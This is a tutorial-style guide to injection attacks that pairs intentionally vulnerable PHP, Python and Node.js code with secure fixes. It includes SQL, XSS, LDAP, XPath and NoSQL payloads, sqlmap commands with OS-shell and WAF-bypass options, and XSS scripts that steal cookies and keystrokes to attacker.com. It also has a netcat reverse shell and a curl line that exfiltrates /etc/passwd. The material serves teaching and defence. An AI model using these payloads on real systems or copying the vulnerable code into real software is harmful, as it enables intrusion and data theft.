# Injection Attacks — Comprehensive Guide

## What is it?

Injection attacks occur when an attacker sends untrusted data to an application to interfere with its execution. The most common forms include SQL injection, Cross-Site Scripting (XSS), command injection, and LDAP injection. These attacks exploit the lack of proper input sanitization and parameterization in application code.

## Why Learn It?

Injection attacks consistently rank among the most dangerous web vulnerabilities on the OWASP Top 10. They can lead to full database compromise, remote code execution, and complete system takeover. Understanding how they work is critical for both offensive and defensive cybersecurity roles.

## You Will Learn

- SQL Injection (classic, blind, time-based, union-based)
- Cross-Site Scripting (reflected, stored, DOM-based)
- Command Injection and OS-level exploitation
- LDAP Injection against directory services
- XPath Injection against XML databases
- NoSQL Injection against document databases

## Prerequisites

- Database Basics (SQL queries, relational models)
- Web Technologies (HTTP methods, form handling, server-side processing)

## Related Topics

- Secure Coding
- Penetration Testing
- OWASP Top 10

---

## Web Architecture — Layer Position Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        USER / ATTACKER                              │
│                   (Browser, curl, Burp Suite)                       │
└────────────────────────────┬────────────────────────────────────────┘
                             │ HTTP/HTTPS Request with Payload
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     LAYER 1: INPUT HANDLING                         │
│            (Form Fields, URL Params, Headers, Cookies)              │
│                                                                     │
│  ◆ XSS Payloads: <script>alert(1)</script>                         │
│  ◆ SQL Payloads: ' OR 1=1--                                        │
│  ◆ Command Payloads: ; cat /etc/passwd                             │
└────────────────────────────┬────────────────────────────────────────┘
                             │ Unvalidated Input
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     LAYER 2: APPLICATION SERVER                      │
│         (Request Parsing, Business Logic, Session Mgmt)             │
│                                                                     │
│  ◆ String Concatenation → SQL Injection                             │
│  ◆ Unescaped Output → XSS                                          │
│  ◆ System Calls → Command Injection                                 │
│  ◆ XML Parsing → XPath Injection                                    │
└────────────────────────────┬────────────────────────────────────────┘
                             │ Malicious Query/Command
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     LAYER 3: INTERPRETERS                           │
│          (SQL Database, LDAP, OS Shell, XML Parser)                 │
│                                                                     │
│  ◆ Executes attacker-controlled input as code                      │
│  ◆ Returns unauthorized data or performs actions                   │
│  ◆ Full system compromise possible                                 │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Attack Flow Diagram — General Injection

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐    ┌──────────┐
│ Attacker │───▶│ Craft Payload  │───▶│ Inject via     │───▶│ Server   │
│          │    │ (Malicious     │    │ Input Field    │    │ Executes │
│          │    │  Input)        │    │ URL, Header    │    │ Payload  │
└──────────┘    └────────────────┘    └────────────────┘    └─────┬────┘
                                                                  │
                           ┌──────────────────────────────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     INJECTION RESULT                                │
├──────────────┬──────────────┬──────────────┬───────────────────────┤
│ SQL Injection│ Command Exec │ XSS Stored   │ Data Exfiltration     │
│ Database     │ OS Access    │ Session      │ Credential            │
│ Full Dump    │ Reverse Shell│ Hijacking    │ Harvesting            │
└──────────────┴──────────────┴──────────────┴───────────────────────┘
```

---

## 1. SQL Injection (SQLi)

### 1.1 Classic SQL Injection

#### Description
Classic SQL injection occurs when user input is directly concatenated into SQL queries, allowing the attacker to alter the query logic.

#### Vulnerable Code (PHP)

```php
<?php
// VULNERABLE: Classic SQL Injection
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Login successful!";
    $user = mysqli_fetch_assoc($result);
    $_SESSION['user_id'] = $user['id'];
} else {
    echo "Invalid credentials.";
}
?>
```

#### Attack Payloads

```
# Authentication Bypass
Username: admin'--
Password: anything

Resulting query:
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
-- Everything after -- is commented out

# Union-Based Data Extraction
Username: ' UNION SELECT null,username,password,null FROM users--

Resulting query:
SELECT * FROM users WHERE username = '' UNION SELECT null,username,password,null FROM users--' AND password = ''

# Stacked Queries (if supported)
Username: admin'; DROP TABLE users;--

# Error-Based Extraction
Username: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### Secure Code (PHP)

```php
<?php
// SECURE: Parameterized Query
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = ? AND password = ?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, "ss", $username, $password);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);

if (mysqli_num_rows($result) > 0) {
    echo "Login successful!";
    $user = mysqli_fetch_assoc($result);
    $_SESSION['user_id'] = $user['id'];
} else {
    echo "Invalid credentials.";
}
?>
```

#### SQLMap Example

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# POST-based injection
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=pass" \
  --batch \
  --dbs

# With cookie authentication
sqlmap -u "http://target.com/admin?id=1" \
  --cookie="session=abc123" \
  --batch \
  --dump -T users

# Custom table/column dump
sqlmap -u "http://target.com/page?id=1" \
  --dump -D mydb -T users -C id,username,password

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,between,randomcase \
  --batch

# OS shell access (if DBA privileges)
sqlmap -u "http://target.com/page?id=1" \
  --os-shell \
  --batch
```

---

### 1.2 Blind SQL Injection

#### Description
Blind SQL injection occurs when the application doesn't return SQL errors or data directly, but the attacker can infer information based on boolean conditions or time delays.

#### 1.2.1 Boolean-Based Blind

#### Vulnerable Code (PHP)

```php
<?php
// VULNERABLE: Boolean-based blind SQLi
$id = $_GET['id'];

$query = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Product found"; // Different response for TRUE/FALSE
} else {
    echo "Product not found";
}
?>
```

#### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐
│ Attacker │───▶│ Send: id=1 AND │───▶│ Response:      │
│          │    │ 1=1 (TRUE)     │    │ "Product found"│
└──────────┘    └────────────────┘    └────────────────┘
       │
       ▼
┌────────────────┐    ┌────────────────┐
│ Send: id=1 AND │───▶│ Response:      │
│ 1=2 (FALSE)    │    │ "Not found"    │
└────────────────┘    └────────────────┘
       │
       ▼
┌────────────────┐    ┌────────────────┐
│ Send: id=1 AND │───▶│ Compare with   │
│ (SELECT LENGTH │    │ TRUE response  │
│ (password)>5)  │    │ → True = 5+   │
└────────────────┘    └────────────────┘
```

#### Attack Payloads

```bash
# Binary search for data extraction
# Step 1: Determine database name length
?id=1 AND (SELECT LENGTH(database())) > 5   # TRUE → length > 5
?id=1 AND (SELECT LENGTH(database())) > 10  # FALSE → length ≤ 10
?id=1 AND (SELECT LENGTH(database())) = 8   # TRUE → length = 8

# Step 2: Extract database name character by character
?id=1 AND ASCII(SUBSTRING(database(),1,1)) > 100  # TRUE
?id=1 AND ASCII(SUBSTRING(database(),1,1)) > 110  # FALSE
?id=1 AND ASCII(SUBSTRING(database(),1,1)) = 109  # TRUE → 'm'

# Automate with SQLMap
sqlmap -u "http://target.com/page?id=1" \
  --technique=B \
  --batch \
  --dump
```

#### 1.2.2 Time-Based Blind

#### Vulnerable Code (PHP)

```php
<?php
// VULNERABLE: Time-based blind SQLi
$id = $_GET['id'];

$query = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $query);

// Application returns same response regardless
echo "Product loaded";
?>
```

#### Attack Payloads

```bash
# MySQL time delay
?id=1 AND IF(1=1, SLEEP(5), 0)       # Delays 5 seconds
?id=1 AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0)

# PostgreSQL time delay
?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

# MSSQL time delay
?id=1; IF (1=1) WAITFOR DELAY '0:0:5'--

# Automate with SQLMap
sqlmap -u "http://target.com/page?id=1" \
  --technique=T \
  --time-sec=5 \
  --batch
```

#### SQLMap Blind Injection Examples

```bash
# Boolean-based blind
sqlmap -u "http://target.com/page?id=1" \
  --technique=B \
  --batch \
  --dump -T users

# Time-based blind
sqlmap -u "http://target.com/page?id=1" \
  --technique=T \
  --time-sec=5 \
  --batch \
  --dump -T users

# Combined techniques
sqlmap -u "http://target.com/page?id=1" \
  --technique=BT \
  --batch \
  --dump

# Extract specific data
sqlmap -u "http://target.com/page?id=1" \
  --technique=T \
  --sql-query="SELECT username FROM users LIMIT 5" \
  --batch
```

---

### 1.3 Union-Based SQL Injection

#### Description
Union-based SQL injection uses the UNION SQL operator to combine results of the original query with results of attacker-controlled queries.

#### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐
│ Attacker │───▶│ Determine      │───▶│ UNION SELECT   │
│          │    │ Column Count   │    │ attacker query │
└──────────┘    └────────────────┘    └────────┬───────┘
                                               │
                                               ▼
┌──────────────────────────────────────────────────────────┐
│ Result Combined Output:                                   │
│ id | name    | username | password                       │
│ 1  | Widget  | admin    | 5f4dcc3b5aa765d61d8327deb...  │
│ 2  | Gadget  | user1    | e99a18c428cb38d5f26085367...  │
└──────────────────────────────────────────────────────────┘
```

#### Attack Steps

```bash
# Step 1: Determine column count
?id=1 ORDER BY 1--    # Works
?id=1 ORDER BY 2--    # Works
?id=1 ORDER BY 3--    # Error → 2 columns

# Step 2: Find visible columns
?id=1 UNION SELECT 1,2--
# Shows which columns appear in output

# Step 3: Extract data
?id=1 UNION SELECT username,password FROM users--
?id=1 UNION SELECT null,CONCAT(username,0x3a,password) FROM users--

# Step 4: Extract from other tables
?id=1 UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=database()--
?id=1 UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--
?id=1 UNION SELECT null,CONCAT(username,0x3a,password) FROM users--
```

#### SQLMap Union-Based Example

```bash
# Union column detection
sqlmap -u "http://target.com/page?id=1" \
  --technique=U \
  --union-cols=5 \
  --union-char="NULL" \
  --batch

# Union with specific database
sqlmap -u "http://target.com/page?id=1" \
  --technique=U \
  --union-cols=5 \
  --dump -D mydb -T users \
  --batch
```

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Reflected XSS

#### Description
Reflected XSS occurs when user input is included in the server's response without proper encoding. The payload is reflected off the server (search boxes, error messages, URL parameters).

#### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐    ┌──────────┐
│ Attacker │───▶│ Send Malicious │───▶│ Server Reflects│───▶│ Victim   │
│          │    │ Link to Victim │    │ Payload in     │    │ Browser  │
│          │    │                │    │ Response       │    │ Executes │
└──────────┘    └────────────────┘    └────────────────┘    └──────────┘
```

#### Vulnerable Code (Node.js)

```javascript
// VULNERABLE: Reflected XSS
app.get('/search', (req, res) => {
  const query = req.query.q;
  // Directly injecting user input into HTML
  res.send(`
    <h1>Search Results for: ${query}</h1>
    <p>No results found</p>
  `);
});

// URL: /search?q=<script>alert('XSS')</script>
// This executes the script in victim's browser
```

#### Secure Code (Node.js)

```javascript
const he = require('he');

// SECURE: Output encoding
app.get('/search', (req, res) => {
  const query = req.query.q;
  const encodedQuery = he.encode(query);

  res.send(`
    <h1>Search Results for: ${encodedQuery}</h1>
    <p>No results found</p>
  `);
});

// Even better: Use template engine with auto-escaping
// EJS, Pug, Handlebars auto-escape by default
```

#### Burp Suite Example

```
# Reflected XSS Detection

1. Spider the application
2. Repeater: Inject payload in all parameters
   GET /search?q=<script>alert('XSS')</script> HTTP/1.1

3. Check response:
   - Is payload reflected verbatim?
   - Is Content-Type text/html?
   - Are there any Content-Security-Policy headers?
   - Is HttpOnly flag set on cookies?

4. Test bypass techniques:
   <script>alert('XSS')</script>
   <img src=x onerror=alert('XSS')>
   <svg onload=alert('XSS')>
   javascript:alert('XSS')
   <details open ontoggle=alert('XSS')>
```

#### XSStrike Example

```bash
# Basic XSS detection
xsstrike -u "http://target.com/search?q=test" --crawl

# With custom headers
xsstrike -u "http://target.com/search?q=test" \
  --headers="Cookie: session=abc123"

# Fuzzing for filter bypass
xsstrike -u "http://target.com/search?q=test" \
  --fuzz \
  --tamper=bypass
```

---

### 2.2 Stored XSS

#### Description
Stored XSS (Persistent XSS) occurs when the malicious script is permanently stored on the target server (database, message forum, comment field).

#### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐
│ Attacker │───▶│ Submit Malicious│───▶│ Server Stores  │
│          │    │ Script via      │    │ in Database    │
│          │    │ Form/Comment    │    │                │
└──────────┘    └────────────────┘    └────────┬───────┘
                                               │
                                               ▼
┌──────────┐    ┌────────────────┐    ┌────────────────┐
│ Any User │───▶│ Visits Page    │───▶│ Script Executes│
│ Visiting │    │ with Stored    │    │ in Their       │
│ Page     │    │ Payload        │    │ Browser        │
└──────────┘    └────────────────┘    └────────────────┘
```

#### Vulnerable Code (PHP)

```php
<?php
// VULNERABLE: Stored XSS in comments
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    $user_id = $_SESSION['user_id'];

    // Directly storing user input
    $query = "INSERT INTO comments (user_id, comment) VALUES ($user_id, '$comment')";
    mysqli_query($conn, $query);
}

// Displaying comments
$comments = mysqli_query($conn, "SELECT * FROM comments");
while ($row = mysqli_fetch_assoc($comments)) {
    echo "<div class='comment'>" . $row['comment'] . "</div>";
}
?>
```

#### Attack Payloads

```javascript
// Basic payload
<script>alert('XSS')</script>

// Cookie theft
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

// Keylogger
<script>
document.onkeypress=function(e){
  new Image().src="http://attacker.com/log?key="+e.key;
}
</script>

// Phishing overlay
<script>
var div=document.createElement('div');
div.innerHTML='<form action="http://attacker.com/phish"><input type="password" name="pass"></form>';
document.body.appendChild(div);
</script>

// Browser extension abuse
<link rel="import" href="http://attacker.com/malicious.html">
```

#### Secure Code (PHP)

```php
<?php
// SECURE: Stored XSS prevention
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    $user_id = $_SESSION['user_id'];

    // Input validation
    $comment = strip_tags($comment); // Remove HTML tags
    $comment = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');

    // Or better: use a Markdown parser with sanitization
    // $comment = $markdown->parse($comment);

    // Parameterized query
    $stmt = mysqli_prepare($conn,
        "INSERT INTO comments (user_id, comment) VALUES (?, ?)"
    );
    mysqli_stmt_bind_param($stmt, "is", $user_id, $comment);
    mysqli_stmt_execute($stmt);
}

// Output encoding when displaying
$comments = mysqli_query($conn, "SELECT * FROM comments");
while ($row = mysqli_fetch_assoc($comments)) {
    echo "<div class='comment'>" .
         htmlspecialchars($row['comment'], ENT_QUOTES, 'UTF-8') .
         "</div>";
}
?>
```

---

### 2.3 DOM-Based XSS

#### Description
DOM-based XSS occurs when the client-side JavaScript modifies the DOM with user-controlled data without proper sanitization. The payload never reaches the server.

#### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐
│ Attacker │───▶│ Craft URL with │───▶│ Client JS       │
│          │    │ Fragment/Hash  │    │ Reads Location  │
│          │    │ Payload        │    │ and Modifies DOM│
└──────────┘    └────────────────┘    └────────┬───────┘
                                               │
                                               ▼
┌──────────────────────────────────────────────────────────┐
│ Payload executes in DOM context:                          │
│ - document.cookie accessible                             │
│ - Same-origin policy applies                             │
│ - No server round-trip needed                            │
└──────────────────────────────────────────────────────────┘
```

#### Vulnerable Code (JavaScript)

```html
<!-- VULNERABLE: DOM-based XSS -->
<script>
  // Reading from URL hash
  var name = location.hash.substring(1);

  // Writing directly to DOM
  document.getElementById('greeting').innerHTML = 'Hello, ' + name + '!';
</script>

<!-- URL: http://target.com/#<img src=x onerror=alert('XSS')> -->
```

#### Secure Code (JavaScript)

```html
<!-- SECURE: DOM-based XSS prevention -->
<script>
  // Reading from URL hash
  var name = location.hash.substring(1);

  // Sanitize input
  name = name.replace(/</g, '&lt;').replace(/>/g, '&gt;');

  // Use textContent instead of innerHTML
  document.getElementById('greeting').textContent = 'Hello, ' + name + '!';
</script>
```

#### Burp Suite DOM XSS Detection

```
1. DOM Invader (Burp Suite Professional):
   - Enable DOM Invader in Burp browser
   - Navigate to target page
   - DOM Invader highlights sinks and sources

2. Manual testing:
   - Search for dangerous sinks: innerHTML, document.write, eval
   - Trace data sources: location, document.referrer, window.name
   - Test each source→sink combination

3. Common DOM XSS vectors:
   #<script>alert(1)</script>
   #"><img src=x onerror=alert(1)>
   javascript:alert(1)
```

---

## 3. Command Injection

### Description
Command injection allows an attacker to execute arbitrary operating system commands on the server by injecting malicious input into system commands.

### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐    ┌──────────┐
│ Attacker │───▶│ Input with     │───▶│ Server Executes│───▶│ OS       │
│          │    │ OS Command     │    │ System Call    │    │ Command  │
│          │    │ Separator      │    │                │    │ Executes │
└──────────┘    └────────────────┘    └────────────────┘    └──────────┘
```

### Vulnerable Code (Python)

```python
import os

@app.route('/ping')
def ping():
    ip = request.args.get('ip')

    # VULNERABLE: Direct command concatenation
    result = os.popen(f"ping -c 4 {ip}").read()
    return result

# Attacker can:
# /ping?ip=127.0.0.1; cat /etc/passwd
# /ping?ip=127.0.0.1 | nc attacker.com 4444 -e /bin/sh
# /ping?ip=$(whoami)
```

### Secure Code (Python)

```python
import subprocess
import shlex
import re

@app.route('/ping')
def ping():
    ip = request.args.get('ip')

    # Input validation
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return "Invalid IP format", 400

    # Use subprocess with argument list (no shell=True)
    try:
        result = subprocess.run(
            ['ping', '-c', '4', ip],
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Request timed out", 504

# Even better: Use a library like ipaddress
import ipaddress
def validate_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False
```

### Burp Suite Example

```
# Command Injection Testing

1. Repeater: Test injection points
   GET /ping?ip=127.0.0.1;id HTTP/1.1
   GET /ping?ip=127.0.0.1|id HTTP/1.1
   GET /ping?ip=`id` HTTP/1.1
   GET /ping?ip=$(id) HTTP/1.1

2. Blind command injection
   GET /ping?ip=127.0.0.1;sleep 5 HTTP/1.1
   → If response delayed 5 seconds = vulnerable

3. Out-of-band detection
   GET /ping?ip=127.0.0.1;nslookup your-burp-collaborator.net HTTP/1.1
   → Check Collaborator for DNS lookup

4. Filter bypass techniques
   GET /ping?ip=127.0.0.1%0aid        (null byte)
   GET /ping?ip=127.0.0.1${IFS}id     (IFS bypass)
   GET /ping?ip=127.0.0.1{,id}        (brace expansion)
```

### Command Injection Payloads

```bash
# Linux
; id
| id
`id`
$(id)
|| id
&& id
%0a id

# Windows
& whoami
| whoami
%0a whoami

# Blind techniques
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)

# Data exfiltration
; cat /etc/passwd | base64
| curl http://attacker.com/shell.php?data=$(cat /etc/passwd)
```

---

## 4. LDAP Injection

### Description
LDAP injection targets Lightweight Directory Access Protocol queries. It's similar to SQL injection but targets directory services used for authentication and user lookups.

### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐    ┌──────────┐
│ Attacker │───▶│ Craft LDAP     │───▶│ Modified LDAP  │───▶│ Directory│
│          │    │ Filter Payload │    │ Query          │    │ Bypassed │
└──────────┘    └────────────────┘    └────────────────┘    └──────────┘
```

### Vulnerable Code (Python)

```python
import ldap

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # VULNERABLE: LDAP injection
    search_filter = f"(&(uid={username})(userPassword={password}))"

    result = ldap_client.search_s(
        "dc=example,dc=com",
        ldap.SCOPE_SUBTREE,
        search_filter
    )

    if result:
        return "Authenticated"
    return "Invalid credentials"
```

### Attack Payloads

```bash
# Authentication bypass
Username: *)(uid=*))(|(uid=*
Password: anything

# Resulting filter:
# (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
# This matches any user

# Another bypass
Username: admin)(!(|
Password: whatever

# Resulting filter:
# (&(uid=admin)(!(|))(userPassword=whatever))
```

### Secure Code (Python)

```python
import ldap
from ldap.filter import escape_filter_chars

@app.route('/login', methods=['POST'])
def login():
    username = escape_filter_chars(request.form['username'])
    password = escape_filter_chars(request.form['password'])

    # SECURE: Escaped LDAP filter
    search_filter = f"(&(uid={username})(userPassword={password}))"

    result = ldap_client.search_s(
        "dc=example,dc=com",
        ldap.SCOPE_SUBTREE,
        search_filter
    )

    if result:
        return "Authenticated"
    return "Invalid credentials"
```

### Burp Suite Example

```
# LDAP Injection Testing

1. Test authentication bypass:
   Username: *)(uid=*))(|(uid=*
   Password: anything

2. Test for error messages:
   Username: invalid)(objectClass=*
   → Different error = potentially vulnerable

3. Test enumeration:
   Username: *)(|(uid=*
   → Returns all users = confirmed vulnerable

4. Use Burp Intruder with LDAP wordlist:
   Payloads: *, )(, )(&, |(, uid=*
```

---

## 5. XPath Injection

### Description
XPath injection targets XML Path Language queries used to navigate XML documents. Similar to SQL/LDAP injection but targets XML databases.

### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐    ┌──────────┐
│ Attacker │───▶│ Craft XPath    │───▶│ Modified XPath │───▶│ XML Data │
│          │    │ Expression     │    │ Query          │    │ Accessed │
└──────────┘    └────────────────┘    └────────────────┘    └──────────┘
```

### Vulnerable Code (Python)

```python
from lxml import etree

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # VULNERABLE: XPath injection
    xml_data = parse_xml('users.xml')

    xpath_query = f"//user[username/text()='{username}' and password/text()='{password}']"
    result = xml_data.xpath(xpath_query)

    if result:
        return "Authenticated"
    return "Invalid credentials"
```

### Attack Payloads

```bash
# Authentication bypass
Username: ' or '1'='1
Password: ' or '1'='1

# Resulting XPath:
# //user[username/text()='' or '1'='1' and password/text()='' or '1'='1']

# Extract all users
Username: ' or '1'='1'] | //user[
Password: anything

# Blind XPath extraction
Username: ' and substring(//user[1]/password,1,1)='a' or '1'='0
```

### Secure Code (Python)

```python
from lxml import etree
import re

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Input validation - only allow alphanumeric
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        return "Invalid username", 400

    xml_data = parse_xml('users.xml')

    # SECURE: Use XPath variables (parameterized)
    xpath_query = "//user[username=$username and password=$password]"
    result = xml_data.xpath(
        xpath_query,
        username=username,
        password=password
    )

    if result:
        return "Authenticated"
    return "Invalid credentials"
```

### Burp Suite Example

```
# XPath Injection Testing

1. Test with single quote:
   Username: admin'
   → Error mentioning XPath = vulnerable

2. Test authentication bypass:
   Username: ' or '1'='1
   Password: ' or '1'='1

3. Extract data:
   Username: ' or substring(//user[1]/password,1,1)='a
   → TRUE response = first char is 'a'

4. Use Burp Intruder for character extraction:
   Position: ' or substring(//user[1]/password,§1§,1)='§a§
   Payloads: 1-20 (positions), a-z (characters)
```

---

## 6. NoSQL Injection

### Description
NoSQL injection targets document databases like MongoDB, CouchDB, and Cassandra. Uses JSON/BSON operators to manipulate queries.

### Attack Flow

```
┌──────────┐    ┌────────────────┐    ┌────────────────┐    ┌──────────┐
│ Attacker │───▶│ Craft NoSQL    │───▶│ Modified Query │───▶│ Database │
│          │    │ Operator       │    │ with Operators │    │ Accessed │
│          │    │ Payload        │    │                │    │          │
└──────────┘    └────────────────┘    └────────────────┘    └──────────┘
```

### Vulnerable Code (Node.js/Express)

```javascript
// VULNERABLE: NoSQL injection in MongoDB
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Direct use of user input
  User.findOne({
    username: username,
    password: password
  }, (err, user) => {
    if (user) {
      res.json({ success: true, token: generateToken(user) });
    } else {
      res.json({ success: false });
    }
  });
});

// Attack: POST /login
// {"username": "admin", "password": {"$gt": ""}}
// This matches any password > empty string
```

### Secure Code (Node.js/Express)

```javascript
// SECURE: Type validation
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Validate types
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input types' });
  }

  // Validate length
  if (username.length > 50 || password.length > 128) {
    return res.status(400).json({ error: 'Input too long' });
  }

  // Now safe - both are strings, not objects
  User.findOne({
    username: username,
    password: hashPassword(password)
  }, (err, user) => {
    if (user) {
      res.json({ success: true, token: generateToken(user) });
    } else {
      res.json({ success: false });
    }
  });
});
```

### Burp Suite Example

```
# NoSQL Injection Testing

1. Test operator injection:
   POST /login
   Content-Type: application/json

   {"username": "admin", "password": {"$ne": ""}}
   → If login succeeds = vulnerable

2. Test regex injection:
   {"username": {"$regex": ".*"}, "password": {"$ne": ""}}
   → Matches all users

3. Test time-based:
   {"username": "admin", "password": {"$regex": "^a.*"}}
   → TRUE response = password starts with 'a'

4. Use Burp Intruder for character extraction:
   Position: {"username":"admin","password":{"$regex":"^§a§.*"}}
   Payloads: a-z, 0-9
```

---

## Injection Prevention Summary

### Prevention Matrix

| Injection Type | Primary Defense | Secondary Defense | Detection |
|---------------|----------------|-------------------|-----------|
| SQL Injection | Parameterized Queries | ORM, WAF | SQLMap, Error messages |
| XSS (Reflected) | Output Encoding | CSP Headers | XSStrike, Burp |
| XSS (Stored) | Input Validation + Output Encoding | CSP, HttpOnly | Manual review |
| XSS (DOM) | Safe DOM APIs | CSP, Trusted Types | DOM Invader |
| Command Injection | Input Validation | subprocess.run() | Command output analysis |
| LDAP Injection | Escape Characters | Parameterized LDAP | Error messages |
| XPath Injection | XPath Variables | Input Validation | Error messages |
| NoSQL Injection | Type Validation | Schema Validation | Operator detection |

### Code-Level Defenses

```javascript
// 1. Parameterized Queries (SQL)
const query = 'SELECT * FROM users WHERE id = $1';
db.query(query, [userId]);

// 2. ORM Usage
const user = await User.findOne({ where: { id: userId } });

// 3. Output Encoding (JavaScript)
function escapeHtml(text) {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// 4. Input Validation
function validateEmail(email) {
  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return re.test(email);
}

// 5. Content Security Policy
res.setHeader('Content-Security-Policy',
  "default-src 'self'; script-src 'self'");
```

---

## Summary Table — Injection Attacks

| Attack | Target | Payload Example | Impact | Difficulty |
|--------|--------|----------------|--------|------------|
| SQL Injection | SQL Database | `' OR 1=1--` | Full DB Access | Medium |
| Blind SQLi | SQL Database | `AND 1=1` | Data Extraction | High |
| Union SQLi | SQL Database | `UNION SELECT` | Data Extraction | Medium |
| Reflected XSS | User Browser | `<script>alert(1)</script>` | Session Hijack | Low |
| Stored XSS | All Users | `<script>malicious</script>` | Full Compromise | Medium |
| DOM XSS | User Browser | `#<script>alert(1)</script>` | Client-Side Attack | High |
| Command Injection | OS Shell | `; cat /etc/passwd` | Full RCE | Medium |
| LDAP Injection | Directory | `*)(uid=*))` | Auth Bypass | Medium |
| XPath Injection | XML DB | `' or '1'='1` | Data Extraction | Medium |
| NoSQL Injection | Document DB | `{"$gt":""}` | Auth Bypass | Medium |

---

## Interview Questions

1. **What is the difference between SQL injection and blind SQL injection?**
   - SQL injection directly returns data/errors. Blind SQLi doesn't return results directly — attacker infers data through boolean conditions or time delays.

2. **How do you prevent XSS in a modern web application?**
   - Output encoding (context-aware), Content Security Policy, HttpOnly cookies, use framework auto-escaping, sanitize HTML if rich text needed.

3. **Explain the difference between stored, reflected, and DOM-based XSS.**
   - Stored: Payload persists in database. Reflected: Payload in URL/request, reflected in response. DOM: Client-side JS processes payload, never reaches server.

4. **How does command injection differ from SQL injection?**
   - SQL injection targets database queries. Command injection targets OS system commands. Both exploit lack of input validation, but at different layers.

5. **What is the best defense against NoSQL injection?**
   - Type validation (ensure inputs are strings, not objects), schema validation, never pass raw user input to database queries.

6. **How would you test for blind SQL injection?**
   - Send boolean conditions (AND 1=1 vs AND 1=2), measure response differences. Use time-based delays (SLEEP, WAITFOR). Automate with SQLMap --technique=B or --technique=T.

7. **What is LDAP injection and how do you prevent it?**
   - LDAP injection manipulates directory service queries. Prevent with escape_filter_chars(), input validation, and using parameterized LDAP bind operations.

---

## Hands-on Labs

| Lab | Platform | Description |
|-----|----------|-------------|
| SQLi Labs | Local | 75+ SQL injection challenges |
| XSS Game | Google | 6 levels of XSS challenges |
| DVWA | Local VM | Injection category challenges |
| HackTheBox | Online | Real-world injection challenges |
| PortSwigger | Online | SQL injection, XSS labs |
| bWAPP | Local | All injection types |
| WebGoat | Docker | Injection lessons |

### Lab Setup Commands

```bash
# SQLi Labs
git clone https://github.com/Audi-1/sqli-labs.git
cd sqli-labs && docker-compose up -d

# XSS Game
# Visit: https://xss-game.appspot.com/

# DVWA
docker run -d -p 80:80 vulnerables/web-dvwa
# Set security level to Low in DVWA config

# WebGoat
docker run -d -p 8080:8080 -p 9090:9090 webgoat/webgoat

# PortSwigger Labs
# Visit: https://portswigger.net/web-security
```

---

*Last updated: 2026-07-16 | OWASP Reference: A03:2021 — Injection*